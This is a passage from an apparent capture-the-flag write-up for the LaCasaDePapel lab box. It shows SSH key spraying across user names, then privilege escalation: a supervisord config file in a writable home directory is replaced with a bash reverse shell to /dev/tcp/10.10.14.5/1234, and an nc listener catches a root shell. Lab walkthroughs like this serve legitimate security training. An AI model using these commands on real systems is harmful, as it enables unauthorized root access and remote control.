With the option parameter and `BatchMode=yes` we can suppress the interactive password to skip every interaction which asks us for the password

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/LaCasaDePapel-10.10.10.131]
└─$ for user in root operator postgres dali berlin professor; do ssh -o BatchMode=yes -i id_rsa $user@10.10.10.131; done
root@10.10.10.131: Permission denied (publickey,password,keyboard-interactive).
operator@10.10.10.131: Permission denied (publickey,password,keyboard-interactive).
postgres@10.10.10.131: Permission denied (publickey,password,keyboard-interactive).
dali@10.10.10.131: Permission denied (publickey,password,keyboard-interactive).
berlin@10.10.10.131: Permission denied (publickey,password,keyboard-interactive).

 _             ____                  ____         ____                  _ 
| |    __ _   / ___|__ _ ___  __ _  |  _ \  ___  |  _ \ __ _ _ __   ___| |
| |   / _` | | |   / _` / __|/ _` | | | | |/ _ \ | |_) / _` | '_ \ / _ \ |
| |__| (_| | | |__| (_| \__ \ (_| | | |_| |  __/ |  __/ (_| | |_) |  __/ |
|_____\__,_|  \____\__,_|___/\__,_| |____/ \___| |_|   \__,_| .__/ \___|_|
                                                            |_|       

lacasadepapel [~]$ whoami
professor
```

So we just find out that the id_rsa file was the key for the professor user. In the professor home folder we find the following files

```bash
lacasadepapel [~]$ ls -la
total 3060
drwxr-sr-x 4 professor professor    4096 Sep 27 10:48 .
drwxr-xr-x 7 root      root         4096 Feb 16  2019 ..
lrwxrwxrwx 1 root      professor       9 Nov  6  2018 .ash_history -> /dev/null
drwx------ 2 professor professor    4096 Jan 31  2019 .ssh
-rw-r--r-- 1 root      nobody         81 Sep 27 10:48 memcached.ini
-rw-r----- 1 root      nobody        434 Jan 29  2019 memcached.js
drwxr-sr-x 9 root      professor    4096 Oct  3  2022 node_modules
```

If we check the processes we see that the file `memcached.js` is executing and the pid changes, so there are different process executing 

```bash
lacasadepapel [~]$ ps auxww | grep memcached.js
 3568 nobody    0:50 /usr/bin/node /home/professor/memcached.js
lacasadepapel [~]$ ps auxww | grep memcached.js
 3638 nobody    0:28 /usr/bin/node /home/professor/memcached.js
```

With `pspy4` we analyze the behavior and we found that **[supervisord](http://supervisord.org/)** is running. It check the config file, then open the `memcached.ini` and executes the comand specified in the file (executes node in the `memcached.js` file)

```bash
lacasadepapel [/tmp/.d]$ ./pspy64 -f
...[snip]...
2019/07/26 05:26:01 FS:                 OPEN | /etc/supervisord.conf
2019/07/26 05:26:01 FS:               ACCESS | /etc/supervisord.conf
2019/07/26 05:26:01 FS:             OPEN DIR | /home/professor
2019/07/26 05:26:01 FS:             OPEN DIR | /home/professor/
2019/07/26 05:26:01 FS:           ACCESS DIR | /home/professor
2019/07/26 05:26:01 FS:           ACCESS DIR | /home/professor/
2019/07/26 05:26:01 FS:           ACCESS DIR | /home/professor
2019/07/26 05:26:01 FS:           ACCESS DIR | /home/professor/
2019/07/26 05:26:01 FS:    CLOSE_NOWRITE DIR | /home/professor
2019/07/26 05:26:01 FS:    CLOSE_NOWRITE DIR | /home/professor/
2019/07/26 05:26:01 FS:                 OPEN | /home/professor/memcached.ini
2019/07/26 05:26:01 FS:               ACCESS | /home/professor/memcached.ini
2019/07/26 05:26:01 FS:        CLOSE_NOWRITE | /home/professor/memcached.ini 
...[snip]...

lacasadepapel [~]$ cat memcached.ini
[program:memcached]
command = sudo -u nobody /usr/bin/node /home/professor/memcached.js
```

We are not owners of the `memcached.ini` file so we cannot modify it, but as we are in the professor home folder and we are logged as professor we can delete it and create another file with the same name with the command we want to execute, in this case a reverse shell

```bash
lacasadepapel [~]$ rm memcached.ini
lacasadepapel [~]$ echo -e "[program:memcached]\ncommand = bash -c 'bash -i >& /dev/tcp/10.10.14.5/1234 0>&1'" > memcached.ini

----------------

┌──(kali㉿kali)-[~]
└─$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.131] 60822
bash: cannot set terminal process group (5305): Not a tty
bash: no job control in this shell
bash-4.4# whoami
whoami
root
```

And we are root